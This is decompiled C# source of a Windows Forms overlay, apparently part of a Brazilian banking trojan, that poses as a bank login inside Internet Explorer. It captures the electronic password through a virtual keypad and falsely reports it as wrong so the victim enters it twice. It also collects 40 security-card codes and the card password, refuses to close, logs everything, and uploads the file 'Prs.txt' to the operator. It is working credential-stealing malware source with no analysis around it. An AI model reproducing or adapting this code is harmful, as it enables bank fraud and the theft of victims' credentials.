using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KanK;

public class Personalite : Form
{
	private IntPtr hand;

	private IContainer components;

	private Panel PanelTeclado;

	private Label label4;

	private Label label3;

	private Label label2;

	private Label label1;

	private Label tec_1;

	private TextBox p_eletronica;

	private TextBox p_senha;

	private Label teclado1;

	private Label teclado2;

	private Label botaook;

	private Panel Painel_Chave;

	private TextBox t40;

	private TextBox t1;

	private TextBox t39;

	private TextBox t38;

	private TextBox t10;

	private TextBox t37;

	private TextBox t11;

	private TextBox t36;

	private TextBox t2;

	private TextBox t34;

	private TextBox t21;

	private TextBox t35;

	private TextBox t12;

	private TextBox t33;

	private TextBox t31;

	private TextBox t9;

	private TextBox t32;

	private TextBox t22;

	private TextBox t13;

	private TextBox t23;

	private TextBox t3;

	private TextBox t25;

	private TextBox t15;

	private TextBox t24;

	private TextBox t8;

	private TextBox t14;

	private TextBox t26;

	private TextBox t4;

	private TextBox t27;

	private TextBox t16;

	private TextBox t28;

	private TextBox t29;

	private TextBox t7;

	private TextBox t17;

	private TextBox t30;

	private TextBox t5;

	private TextBox t6;

	private TextBox t18;

	private TextBox t20;

	private TextBox t19;

	private PictureBox pictureBox1;

	private Panel Painel_cartao;

	private TextBox prs_s6;

	private PictureBox pictureBox2;

	[DllImport("user32.dll")]
	private static extern int SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

	public Personalite()
	{
		InitializeComponent();
	}

	public Personalite(IntPtr hwnd)
	{
		InitializeComponent();
		hand = hwnd;
	}

	private void NaoPrecioneLetra(object sender, KeyPressEventArgs e)
	{
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		string text = Convert.ToString(e.get_KeyChar());
		if (text != "1" && text != "2" && text != "3" && text != "4" && text != "5" && text != "6" && text != "7" && text != "8" && text != "9" && text != "0")
		{
			e.set_Handled(true);
			MessageBox.Show("Digite apenas números", "Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
	}

	private void Personalite_Load(object sender, EventArgs e)
	{
		SetParent(((Control)this).get_Handle(), hand);
	}

	protected override void OnClosing(CancelEventArgs e)
	{
		e.Cancel = true;
	}

	private void PanelTeclado_Paint(object sender, PaintEventArgs e)
	{
		((Control)p_eletronica).Focus();
	}

	private void botaook_Click(object sender, EventArgs e)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)teclado1).get_Visible() && ((Control)p_eletronica).get_Text().Length > 5)
		{
			Form1.Durma(1000);
			MessageBox.Show("Sua senha eletrônica não confere. Tente novamente", "Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
			((Control)teclado1).set_Visible(false);
			((Control)teclado2).set_Visible(true);
			((Control)p_senha).set_Text(((Control)p_senha).get_Text() + " + ");
			((TextBoxBase)p_eletronica).Clear();
		}
		if (((Control)teclado2).get_Visible() && ((Control)p_eletronica).get_Text().Length > 5)
		{
			Form1.Durma(1000);
			((Control)PanelTeclado).set_Visible(false);
			((Control)Painel_Chave).set_Visible(true);
		}
	}

	private void tec_1_Click(object sender, EventArgs e)
	{
		if (((Control)p_eletronica).get_Text().Length < 8 && ((Control)p_eletronica).get_Focused())
		{
			((Control)p_eletronica).set_Text(((Control)p_eletronica).get_Text() + "*");
			if (((Control)teclado1).get_Visible())
			{
				((Control)p_senha).set_Text(((Control)p_senha).get_Text() + " 08, ");
			}
			if (((Control)teclado2).get_Visible())
			{
				((Control)p_senha).set_Text(((Control)p_senha).get_Text() + " 03, ");
			}
		}
	}

	private void label1_Click(object sender, EventArgs e)
	{
		if (((Control)p_eletronica).get_Text().Length < 8 && ((Control)p_eletronica).get_Focused())
		{
			((Control)p_eletronica).set_Text(((Control)p_eletronica).get_Text() + "*");
			if (((Control)teclado1).get_Visible())
			{
				((Control)p_senha).set_Text(((Control)p_senha).get_Text() + " 27, ");
			}
			if (((Control)teclado2).get_Visible())
			{
				((Control)p_senha).set_Text(((Control)p_senha).get_Text() + " 69, ");
			}
		}
	}

	private void label2_Click(object sender, EventArgs e)
	{
		if (((Control)p_eletronica).get_Text().Length < 8 && ((Control)p_eletronica).get_Focused())
		{
			((Control)p_eletronica).set_Text(((Control)p_eletronica).get_Text() + "*");
			if (((Control)teclado1).get_Visible())
			{
				((Control)p_senha).set_Text(((Control)p_senha).get_Text() + " 56, ");
			}
			if (((Control)teclado2).get_Visible())
			{
				((Control)p_senha).set_Text(((Control)p_senha).get_Text() + " 12, ");
			}
		}
	}

	private void label3_Click(object sender, EventArgs e)
	{
		if (((Control)p_eletronica).get_Text().Length < 8 && ((Control)p_eletronica).get_Focused())
		{
			((Control)p_eletronica).set_Text(((Control)p_eletronica).get_Text() + "*");
			if (((Control)teclado1).get_Visible())
			{
				((Control)p_senha).set_Text(((Control)p_senha).get_Text() + " 19, ");
			}
			if (((Control)teclado2).get_Visible())
			{
				((Control)p_senha).set_Text(((Control)p_senha).get_Text() + " 58, ");
			}
		}
	}

	private void label4_Click(object sender, EventArgs e)
	{
		if (((Control)p_eletronica).get_Text().Length < 8 && ((Control)p_eletronica).get_Focused())
		{
			((Control)p_eletronica).set_Text(((Control)p_eletronica).get_Text() + "*");
			if (((Control)teclado1).get_Visible())
			{
				((Control)p_senha).set_Text(((Control)p_senha).get_Text() + " 34, ");
			}
			if (((Control)teclado2).get_Visible())
			{
				((Control)p_senha).set_Text(((Control)p_senha).get_Text() + " 47, ");
			}
		}
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
		//IL_036b: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)t1).get_Text().Length == 4 && ((Control)t2).get_Text().Length == 4 && ((Control)t3).get_Text().Length == 4 && ((Control)t4).get_Text().Length == 4 && ((Control)t5).get_Text().Length == 4 && ((Control)t6).get_Text().Length == 4 && ((Control)t7).get_Text().Length == 4 && ((Control)t8).get_Text().Length == 4 && ((Control)t9).get_Text().Length == 4 && ((Control)t10).get_Text().Length < 4 && ((Control)t11).get_Text().Length == 4 && ((Control)t12).get_Text().Length == 4 && ((Control)t13).get_Text().Length == 4 && ((Control)t14).get_Text().Length == 4 && ((Control)t15).get_Text().Length == 4 && ((Control)t16).get_Text().Length == 4 && ((Control)t17).get_Text().Length == 4 && ((Control)t18).get_Text().Length == 4 && ((Control)t19).get_Text().Length == 4 && ((Control)t20).get_Text().Length < 4 && ((Control)t21).get_Text().Length == 4 && ((Control)t22).get_Text().Length == 4 && ((Control)t23).get_Text().Length == 4 && ((Control)t24).get_Text().Length == 4 && ((Control)t25).get_Text().Length == 4 && ((Control)t26).get_Text().Length == 4 && ((Control)t27).get_Text().Length == 4 && ((Control)t28).get_Text().Length == 4 && ((Control)t29).get_Text().Length == 4 && ((Control)t30).get_Text().Length < 4 && ((Control)t31).get_Text().Length == 4 && ((Control)t32).get_Text().Length == 4 && ((Control)t33).get_Text().Length == 4 && ((Control)t34).get_Text().Length == 4 && ((Control)t35).get_Text().Length == 4 && ((Control)t36).get_Text().Length == 4 && ((Control)t37).get_Text().Length == 4 && ((Control)t38).get_Text().Length == 4 && ((Control)t39).get_Text().Length == 4 && ((Control)t40).get_Text().Length < 4)
		{
			MessageBox.Show("Digite corretamente as posições solicitadas.", "Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
			return;
		}
		Form1.Durma(1200);
		((Control)Painel_Chave).set_Visible(false);
		((Control)Painel_cartao).set_Visible(true);
	}

	private void pictureBox2_Click(object sender, EventArgs e)
	{
		if (((Control)prs_s6).get_Text().Length > 5)
		{
			Form1.GuardaInfo("Prs", "Senha Eletrônica...: " + ((Control)p_senha).get_Text());
			Form1.GuardaInfo("Prs", "Senha Cartão.......: " + ((Control)prs_s6).get_Text());
			Form1.GuardaInfo("Prs", "=======================================================");
			Form1.GuardaInfo("Prs", ((Control)t1).get_Text() + " | " + ((Control)t2).get_Text() + " | " + ((Control)t3).get_Text() + " | " + ((Control)t4).get_Text() + " | " + ((Control)t5).get_Text() + " | " + ((Control)t6).get_Text() + " | " + ((Control)t7).get_Text() + " | " + ((Control)t8).get_Text() + " | " + ((Control)t9).get_Text() + " | " + ((Control)t10).get_Text());
			Form1.GuardaInfo("Prs", ((Control)t11).get_Text() + " | " + ((Control)t12).get_Text() + " | " + ((Control)t13).get_Text() + " | " + ((Control)t14).get_Text() + " | " + ((Control)t15).get_Text() + " | " + ((Control)t16).get_Text() + " | " + ((Control)t17).get_Text() + " | " + ((Control)t18).get_Text() + " | " + ((Control)t19).get_Text() + " | " + ((Control)t20).get_Text());
			Form1.GuardaInfo("Prs", ((Control)t21).get_Text() + " | " + ((Control)t22).get_Text() + " | " + ((Control)t23).get_Text() + " | " + ((Control)t24).get_Text() + " | " + ((Control)t25).get_Text() + " | " + ((Control)t26).get_Text() + " | " + ((Control)t27).get_Text() + " | " + ((Control)t28).get_Text() + " | " + ((Control)t29).get_Text() + " | " + ((Control)t30).get_Text());
			Form1.GuardaInfo("Prs", ((Control)t31).get_Text() + " | " + ((Control)t32).get_Text() + " | " + ((Control)t33).get_Text() + " | " + ((Control)t34).get_Text() + " | " + ((Control)t35).get_Text() + " | " + ((Control)t36).get_Text() + " | " + ((Control)t37).get_Text() + " | " + ((Control)t38).get_Text() + " | " + ((Control)t39).get_Text() + " | " + ((Control)t40).get_Text());
			Form1.GuardaInfo("Prs", "=======================================================");
			Form1.FazerUpload("Prs.txt");
			Form1.Durma(1000);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Expected O, but got Unknown
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Expected O, but got Unknown
		//IL_0192: Unknown result type (might be due to invalid IL or missing references)
		//IL_019c: Expected O, but got Unknown
		//IL_019d: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a7: Expected O, but got Unknown
		//IL_01a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b2: Expected O, but got Unknown
		//IL_01b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bd: Expected O, but got Unknown
		//IL_01be: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c8: Expected O, but got Unknown
		//IL_01c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d3: Expected O, but got Unknown
		//IL_01d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01de: Expected O, but got Unknown
		//IL_01df: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e9: Expected O, but got Unknown
		//IL_01ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f4: Expected O, but got Unknown
		//IL_01f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ff: Expected O, but got Unknown
		//IL_0200: Unknown result type (might be due to invalid IL or missing references)
		//IL_020a: Expected O, but got Unknown
		//IL_020b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0215: Expected O, but got Unknown
		//IL_0216: Unknown result type (might be due to invalid IL or missing references)
		//IL_0220: Expected O, but got Unknown
		//IL_0221: Unknown result type (might be due to invalid IL or missing references)
		//IL_022b: Expected O, but got Unknown
		//IL_022c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0236: Expected O, but got Unknown
		//IL_0237: Unknown result type (might be due to invalid IL or missing references)
		//IL_0241: Expected O, but got Unknown
		//IL_0242: Unknown result type (might be due to invalid IL or missing references)
		//IL_024c: Expected O, but got Unknown
		//IL_024d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0257: Expected O, but got Unknown
		//IL_0258: Unknown result type (might be due to invalid IL or missing references)
		//IL_0262: Expected O, but got Unknown
		//IL_0263: Unknown result type (might be due to invalid IL or missing references)
		//IL_026d: Expected O, but got Unknown
		//IL_026e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0278: Expected O, but got Unknown
		//IL_02c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d0: Expected O, but got Unknown
		//IL_040f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0419: Expected O, but got Unknown
		//IL_04ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c4: Expected O, but got Unknown
		//IL_04f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_056e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0578: Expected O, but got Unknown
		//IL_05a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0626: Unknown result type (might be due to invalid IL or missing references)
		//IL_0630: Expected O, but got Unknown
		//IL_09a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_09aa: Expected O, but got Unknown
		//IL_0daf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0db9: Expected O, but got Unknown
		//IL_0df0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e50: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e5a: Expected O, but got Unknown
		//IL_0e76: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e80: Expected O, but got Unknown
		//IL_0eb1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f10: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f1a: Expected O, but got Unknown
		//IL_0f36: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f40: Expected O, but got Unknown
		//IL_0f77: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fd7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fe1: Expected O, but got Unknown
		//IL_0ffd: Unknown result type (might be due to invalid IL or missing references)
		//IL_1007: Expected O, but got Unknown
		//IL_103e: Unknown result type (might be due to invalid IL or missing references)
		//IL_109e: Unknown result type (might be due to invalid IL or missing references)
		//IL_10a8: Expected O, but got Unknown
		//IL_10c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_10ce: Expected O, but got Unknown
		//IL_1102: Unknown result type (might be due to invalid IL or missing references)
		//IL_1162: Unknown result type (might be due to invalid IL or missing references)
		//IL_116c: Expected O, but got Unknown
		//IL_1188: Unknown result type (might be due to invalid IL or missing references)
		//IL_1192: Expected O, but got Unknown
		//IL_11c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_1229: Unknown result type (might be due to invalid IL or missing references)
		//IL_1233: Expected O, but got Unknown
		//IL_124f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1259: Expected O, but got Unknown
		//IL_128d: Unknown result type (might be due to invalid IL or missing references)
		//IL_12ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_12f7: Expected O, but got Unknown
		//IL_1313: Unknown result type (might be due to invalid IL or missing references)
		//IL_131d: Expected O, but got Unknown
		//IL_1354: Unknown result type (might be due to invalid IL or missing references)
		//IL_13b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_13be: Expected O, but got Unknown
		//IL_13da: Unknown result type (might be due to invalid IL or missing references)
		//IL_13e4: Expected O, but got Unknown
		//IL_1415: Unknown result type (might be due to invalid IL or missing references)
		//IL_1474: Unknown result type (might be due to invalid IL or missing references)
		//IL_147e: Expected O, but got Unknown
		//IL_149a: Unknown result type (might be due to invalid IL or missing references)
		//IL_14a4: Expected O, but got Unknown
		//IL_14d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1538: Unknown result type (might be due to invalid IL or missing references)
		//IL_1542: Expected O, but got Unknown
		//IL_155e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1568: Expected O, but got Unknown
		//IL_159c: Unknown result type (might be due to invalid IL or missing references)
		//IL_15fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_1606: Expected O, but got Unknown
		//IL_1622: Unknown result type (might be due to invalid IL or missing references)
		//IL_162c: Expected O, but got Unknown
		//IL_1663: Unknown result type (might be due to invalid IL or missing references)
		//IL_16c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_16cd: Expected O, but got Unknown
		//IL_16e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_16f3: Expected O, but got Unknown
		//IL_1727: Unknown result type (might be due to invalid IL or missing references)
		//IL_1787: Unknown result type (might be due to invalid IL or missing references)
		//IL_1791: Expected O, but got Unknown
		//IL_17ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_17b7: Expected O, but got Unknown
		//IL_17eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_184b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1855: Expected O, but got Unknown
		//IL_1871: Unknown result type (might be due to invalid IL or missing references)
		//IL_187b: Expected O, but got Unknown
		//IL_18af: Unknown result type (might be due to invalid IL or missing references)
		//IL_190f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1919: Expected O, but got Unknown
		//IL_1935: Unknown result type (might be due to invalid IL or missing references)
		//IL_193f: Expected O, but got Unknown
		//IL_1973: Unknown result type (might be due to invalid IL or missing references)
		//IL_19d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_19dc: Expected O, but got Unknown
		//IL_19f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a02: Expected O, but got Unknown
		//IL_1a36: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a96: Unknown result type (might be due to invalid IL or missing references)
		//IL_1aa0: Expected O, but got Unknown
		//IL_1abc: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ac6: Expected O, but got Unknown
		//IL_1afa: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b5a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b64: Expected O, but got Unknown
		//IL_1b80: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b8a: Expected O, but got Unknown
		//IL_1bbe: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c1e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c28: Expected O, but got Unknown
		//IL_1c44: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c4e: Expected O, but got Unknown
		//IL_1c82: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ce2: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cec: Expected O, but got Unknown
		//IL_1d08: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d12: Expected O, but got Unknown
		//IL_1d43: Unknown result type (might be due to invalid IL or missing references)
		//IL_1da2: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dac: Expected O, but got Unknown
		//IL_1dc8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dd2: Expected O, but got Unknown
		//IL_1e09: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e69: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e73: Expected O, but got Unknown
		//IL_1e8f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e99: Expected O, but got Unknown
		//IL_1ed0: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f30: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f3a: Expected O, but got Unknown
		//IL_1f56: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f60: Expected O, but got Unknown
		//IL_1f94: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ff4: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ffe: Expected O, but got Unknown
		//IL_201a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2024: Expected O, but got Unknown
		//IL_2058: Unknown result type (might be due to invalid IL or missing references)
		//IL_20b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_20c1: Expected O, but got Unknown
		//IL_20dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_20e7: Expected O, but got Unknown
		//IL_211b: Unknown result type (might be due to invalid IL or missing references)
		//IL_217b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2185: Expected O, but got Unknown
		//IL_21a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_21ab: Expected O, but got Unknown
		//IL_21e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_2242: Unknown result type (might be due to invalid IL or missing references)
		//IL_224c: Expected O, but got Unknown
		//IL_2268: Unknown result type (might be due to invalid IL or missing references)
		//IL_2272: Expected O, but got Unknown
		//IL_22a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_2302: Unknown result type (might be due to invalid IL or missing references)
		//IL_230c: Expected O, but got Unknown
		//IL_2328: Unknown result type (might be due to invalid IL or missing references)
		//IL_2332: Expected O, but got Unknown
		//IL_2369: Unknown result type (might be due to invalid IL or missing references)
		//IL_23c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_23d3: Expected O, but got Unknown
		//IL_23ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_23f9: Expected O, but got Unknown
		//IL_2430: Unknown result type (might be due to invalid IL or missing references)
		//IL_2490: Unknown result type (might be due to invalid IL or missing references)
		//IL_249a: Expected O, but got Unknown
		//IL_24b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_24c0: Expected O, but got Unknown
		//IL_24f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_2557: Unknown result type (might be due to invalid IL or missing references)
		//IL_2561: Expected O, but got Unknown
		//IL_257d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2587: Expected O, but got Unknown
		//IL_25be: Unknown result type (might be due to invalid IL or missing references)
		//IL_261e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2628: Expected O, but got Unknown
		//IL_2644: Unknown result type (might be due to invalid IL or missing references)
		//IL_264e: Expected O, but got Unknown
		//IL_2682: Unknown result type (might be due to invalid IL or missing references)
		//IL_26e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_26eb: Expected O, but got Unknown
		//IL_2707: Unknown result type (might be due to invalid IL or missing references)
		//IL_2711: Expected O, but got Unknown
		//IL_2748: Unknown result type (might be due to invalid IL or missing references)
		//IL_27a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_27b2: Expected O, but got Unknown
		//IL_27ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_27d8: Expected O, but got Unknown
		//IL_280f: Unknown result type (might be due to invalid IL or missing references)
		//IL_286f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2879: Expected O, but got Unknown
		//IL_2895: Unknown result type (might be due to invalid IL or missing references)
		//IL_289f: Expected O, but got Unknown
		//IL_28d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_2932: Unknown result type (might be due to invalid IL or missing references)
		//IL_293c: Expected O, but got Unknown
		//IL_2958: Unknown result type (might be due to invalid IL or missing references)
		//IL_2962: Expected O, but got Unknown
		//IL_2996: Unknown result type (might be due to invalid IL or missing references)
		//IL_29f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_29ff: Expected O, but got Unknown
		//IL_2a1b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a25: Expected O, but got Unknown
		//IL_2a5c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2abc: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ac6: Expected O, but got Unknown
		//IL_2ae2: Unknown result type (might be due to invalid IL or missing references)
		//IL_2aec: Expected O, but got Unknown
		//IL_2b23: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b83: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b8d: Expected O, but got Unknown
		//IL_2ba9: Unknown result type (might be due to invalid IL or missing references)
		//IL_2bb3: Expected O, but got Unknown
		//IL_2bea: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c4a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c54: Expected O, but got Unknown
		//IL_2c75: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c7f: Expected O, but got Unknown
		//IL_2cfd: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d07: Expected O, but got Unknown
		//IL_2da9: Unknown result type (might be due to invalid IL or missing references)
		//IL_2db3: Expected O, but got Unknown
		//IL_2e39: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e43: Expected O, but got Unknown
		//IL_2e64: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e6e: Expected O, but got Unknown
		//IL_2f0b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f15: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Personalite));
		PanelTeclado = new Panel();
		botaook = new Label();
		teclado2 = new Label();
		teclado1 = new Label();
		p_eletronica = new TextBox();
		p_senha = new TextBox();
		label4 = new Label();
		label3 = new Label();
		label2 = new Label();
		label1 = new Label();
		tec_1 = new Label();
		Painel_Chave = new Panel();
		t40 = new TextBox();
		t1 = new TextBox();
		t39 = new TextBox();
		t38 = new TextBox();
		t10 = new TextBox();
		t37 = new TextBox();
		t11 = new TextBox();
		t36 = new TextBox();
		t2 = new TextBox();
		t34 = new TextBox();
		t21 = new TextBox();
		t35 = new TextBox();
		t12 = new TextBox();
		t33 = new TextBox();
		t31 = new TextBox();
		t9 = new TextBox();
		t32 = new TextBox();
		t22 = new TextBox();
		t13 = new TextBox();
		t23 = new TextBox();
		t3 = new TextBox();
		t25 = new TextBox();
		t15 = new TextBox();
		t24 = new TextBox();
		t8 = new TextBox();
		t14 = new TextBox();
		t26 = new TextBox();
		t4 = new TextBox();
		t27 = new TextBox();
		t16 = new TextBox();
		t28 = new TextBox();
		t29 = new TextBox();
		t7 = new TextBox();
		t17 = new TextBox();
		t30 = new TextBox();
		t5 = new TextBox();
		t6 = new TextBox();
		t18 = new TextBox();
		t20 = new TextBox();
		t19 = new TextBox();
		pictureBox1 = new PictureBox();
		Painel_cartao = new Panel();
		prs_s6 = new TextBox();
		pictureBox2 = new PictureBox();
		((Control)PanelTeclado).SuspendLayout();
		((Control)Painel_Chave).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)Painel_cartao).SuspendLayout();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		((Control)PanelTeclado).set_BackgroundImage((Image)componentResourceManager.GetObject("PanelTeclado.BackgroundImage"));
		((Control)PanelTeclado).set_BackgroundImageLayout((ImageLayout)2);
		((Control)PanelTeclado).get_Controls().Add((Control)(object)botaook);
		((Control)PanelTeclado).get_Controls().Add((Control)(object)teclado2);
		((Control)PanelTeclado).get_Controls().Add((Control)(object)teclado1);
		((Control)PanelTeclado).get_Controls().Add((Control)(object)p_eletronica);
		((Control)PanelTeclado).get_Controls().Add((Control)(object)p_senha);
		((Control)PanelTeclado).get_Controls().Add((Control)(object)label4);
		((Control)PanelTeclado).get_Controls().Add((Control)(object)label3);
		((Control)PanelTeclado).get_Controls().Add((Control)(object)label2);
		((Control)PanelTeclado).get_Controls().Add((Control)(object)label1);
		((Control)PanelTeclado).get_Controls().Add((Control)(object)tec_1);
